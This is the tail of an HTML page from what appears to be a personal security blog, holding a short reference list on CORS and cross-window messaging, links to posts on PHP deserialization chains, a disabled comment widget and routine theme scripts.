+<p><code>https://yrq110.me/post/front-end/cross-domain-and-cross-document-communication/</code></p>
+<p><code>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</code></p>
+<p><code>https://vinothkumar.me/20000-facebook-dom-xss/</code></p>
+<p><code>https://javascript.info/cross-window-communication</code></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2021/03/09/Laravel8-new-pop-chain-mining-process/" style="float: left;">
+        ← Laravel8 new pop chain mining process
+    </a>
+    
+    
+    <a class="pull-right" href="/2020/12/09/Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop/">
+        Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
